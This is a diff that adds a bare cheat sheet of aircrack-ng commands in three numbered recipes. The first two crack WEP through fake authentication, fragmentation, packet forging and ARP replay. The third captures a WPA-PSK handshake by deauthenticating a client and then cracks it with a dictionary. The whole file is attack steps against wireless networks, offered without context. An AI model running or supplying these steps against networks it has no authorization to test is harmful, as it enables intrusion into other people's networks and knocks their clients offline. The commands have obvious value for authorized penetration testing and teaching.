@@ -1,0 +1,31 @@
+
+1.1 #iwconfig
+1.2 #airmon-ng start wlan0
+1.3 #airodump-ng mon0
+1.4 #airodump-ng -c 3 --bssid <bssid> mon0 -w <FileName1>
+1.5 # aireplay-ng -1 0 -e '<essid>' -a <bssid> -h <mac_id> mon0  //FakeAuthentication
+
+//if network has no clients
+
+1.6 #aireplay-ng -5 -b <bssid> -h <hostmac> mon0
+1.7 #packetforge-ng -0 -a <bssid> -h <host_mac> -l 192.168.1.101 -k 192.168.1.255 -y fragment..xor -w  <FileName1>
+1.8 #aircrack-ng -0 <FileName-01.cap>
+
+
+
+2.1 #iwconfig
+2.2 #airmon-ng start wlan0
+2.3 #airodump-ng mon0
+2.4 #airodump-ng -c 3 --bssid <bssid> mon0 -w <FileName2>
+2.5 # aireplay-ng -1 0 -e '<essid>' -a <bssid> -h <mac_id> mon0  //FakeAuthentication
+2.6 # aireplay-ng -1 0 -e '<essid>' -y <XXXX.xor> -h <mac_id> mon0  //FakeAuthentication
+2.7 # aireplay-ng --arpreplay -b <bssid> -h <host_mac> mon0
+aircrack-ng -0 FileName2.cap
+
+
+3.1 #iwconfig
+3.2 #airmon-ng start wlan0
+3.3 #airodump-ng mon0
+3.4 #airodump-ng -c 3 --bssid <bssid> -w <FileName3>
+aireplay-ng -0 1 -a <bssid> -c <host_mac> mon0
+aircrack-ng -0 -w psk-crack-dictionary FileName3.cap
